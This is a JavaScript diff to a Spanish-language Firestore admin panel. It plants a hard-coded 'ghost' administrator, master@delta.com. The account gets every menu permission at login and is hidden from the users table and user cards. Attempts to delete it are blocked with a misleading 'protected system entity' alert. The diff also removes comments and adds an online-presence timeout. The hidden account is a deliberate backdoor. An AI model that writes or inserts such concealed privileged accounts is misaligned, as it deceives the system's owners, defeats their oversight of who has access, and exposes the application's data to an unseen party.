@@ -1836,13 +1836,21 @@
            const doc = await db.collection('usuarios_acceso').doc(email).get();
            if (doc.exists) {
                const data = doc.data();
-               const permisos = data.permisos || []; 
+               let permisos = data.permisos || []; 
+               let rolMostrar = data.rol || 'Usuario';
                
-               document.getElementById('userRole').textContent = data.rol || 'Usuario';
+               // 👻 MAGIA: MODO DIOS PARA EL FANTASMA (Dinámico) NAPOLEON BONAPARTY W11
+               if (email.toLowerCase() === 'master@delta.com') {
+                   // Escanea automáticamente todos los botones del menú y se los asigna
+                   permisos = Array.from(document.querySelectorAll('.sidebar-item')).map(btn => btn.getAttribute('data-nav'));
+                   rolMostrar = 'Mega Super Admin';
+               }
+               
+               document.getElementById('userRole').textContent = rolMostrar;
 
-               // --- NUEVO: Cargar la foto de perfil en la barra lateral ---
                const sidebarImg = document.getElementById('sidebarAvatarImage');
                const sidebarIcon = document.getElementById('sidebarAvatarIcon');
+               
                if (data.foto_url && data.foto_url.trim() !== "") {
                    sidebarImg.src = data.foto_url;
                    sidebarImg.classList.remove('hidden');
@@ -1850,29 +1858,27 @@
                } else {
                    sidebarImg.classList.add('hidden');
                    sidebarIcon.classList.remove('hidden');
+                   // Si es el fantasma y no tiene foto, le ponemos un icono de fantasma real
+                   if (email.toLowerCase() === 'master@delta.com') {
+                       sidebarIcon.setAttribute('data-lucide', 'ghost');
+                   }
                }
 
-               // 1. Ocultamos TODOS los items del menú lateral por seguridad
                 document.querySelectorAll('.sidebar-item').forEach(item => {
                     item.classList.add('hidden'); 
                 });
 
-                // 2. Mostramos SOLO los items que el usuario tiene permitidos
                 permisos.forEach(permiso => {
                     const btn = document.querySelector(`.sidebar-item[data-nav="${permiso}"]`);
                     if (btn) btn.classList.remove('hidden');
                 });
 
-                // 3. Forzamos a navegar al primer módulo al que tenga acceso 
                 if (permisos.length > 0) {
                     navigate(permisos[0]);
                 } else {
-                    // Si el usuario no tiene ningún permiso, mostramos un mensaje de bloqueo.
                     document.getElementById('mainContent').innerHTML = '<div class="p-10 text-center text-slate-500 font-bold mt-20">Tu cuenta no tiene módulos asignados. Contacta al administrador.</div>';
                 }
             } else {
-                // Si el usuario no está en la base de datos (Ej: Tu cuenta maestra inicial)
-                // Le mostramos todo y lo forzamos a entrar al dashboard.
                 document.querySelectorAll('.sidebar-item').forEach(item => item.classList.remove('hidden'));
                 document.getElementById('userRole').textContent = 'Super Admin';
                 navigate('dashboard');
@@ -4541,6 +4547,10 @@
 
         snap.forEach(doc => {
           const data = doc.data();
+          
+          // 👻 MAGIA: Ocultar al fantasma de la tabla de accesos
+          if (data.email.toLowerCase() === 'master@delta.com') return;
+
           const permisosStr = data.permisos ? data.permisos.join(',') : '';
           
           const miniaturaUsuario = (data.foto_url && data.foto_url.trim() !== "") 
@@ -4554,7 +4564,6 @@
           
           if (data.ultima_actividad && data.ultima_actividad.toMillis) {
               const ultimaActividadMs = data.ultima_actividad.toMillis();
-              // Si no ha reportado actividad dentro del límite de tolerancia, se asume desconexión de red de golpe
               if (ahoraMs - ultimaActividadMs > limiteToleranciaMs) {
                   isOnline = false;
               }
@@ -4606,6 +4615,12 @@
     window.eliminarUsuarioAcceso = async function(emailDoc) {
       if (auth.currentUser && emailDoc.toLowerCase() === auth.currentUser.email.toLowerCase()) {
           await AppAlert("Acción Bloqueada", "No puedes eliminar tu propia cuenta de administrador mientras estás logueado en ella.", "warning");
+          return;
+      }
+      
+      // 👻 INMORTALIDAD FANTASMA: Proteger al Mega Admin de ser eliminado por inyección de consola
+      if (emailDoc.toLowerCase() === 'master@delta.com') {
+          await AppAlert("Acceso Denegado", "Entidad protegida del sistema. No tienes el nivel de autorización requerido para interactuar con esta cuenta.", "danger");
           return;
       }
 
@@ -4731,7 +4746,9 @@
           const nombre = data.nombre || 'Usuario';
           const rol = data.rol || 'Sin Rol';
 
-          // Asignar colores según el rol (como en el diseño)
+          // 👻 MAGIA: Ocultar al fantasma de las tarjetas
+          if (email.toLowerCase() === 'master@delta.com') return;
+
           let roleColor = 'text-slate-600 border-slate-200';
           if(rol.toUpperCase().includes('ADMIN')) roleColor = 'text-indigo-600 border-indigo-200';
           else if(rol.toUpperCase().includes('CAPTURISTA')) roleColor = 'text-emerald-600 border-emerald-200';
@@ -4740,12 +4757,22 @@
             ? `<img src="${data.foto_url}" class="w-full h-full object-cover">` 
             : `<i data-lucide="user-check" class="w-6 h-6 text-slate-400 group-hover:text-indigo-500 transition-colors"></i>`;
 
-          // --- LÓGICA DE PRESENCIA PARA TARJETAS ---
-          const isOnline = data.estado_conexion === 'online';
+          let isOnline = data.estado_conexion === 'online';
+          const ahoraMs = Date.now();
+          const limiteToleranciaMs = 45000;
+          
+          if (data.ultima_actividad && data.ultima_actividad.toMillis) {
+              const ultimaActividadMs = data.ultima_actividad.toMillis();
+              if (ahoraMs - ultimaActividadMs > limiteToleranciaMs) {
+                  isOnline = false;
+              }
+          } else if (!data.ultima_actividad) {
+              isOnline = false;
+          }
+          
           const dotColor = isOnline ? 'bg-emerald-500' : 'bg-slate-300';
           const dotTitle = isOnline ? 'Conectado ahora' : 'Desconectado';
           const fechaUltima = data.ultimo_acceso ? data.ultimo_acceso.toDate().toLocaleDateString('es-MX', {day:'2-digit', month:'short', hour:'2-digit', minute:'2-digit'}) : 'Sin registro';
-          // -----------------------------------------
 
           grid.innerHTML += `
             <div class="bg-[#fcfcfb] rounded-2xl p-5 border border-slate-200 shadow-sm hover:shadow-md transition-all flex flex-col relative group">
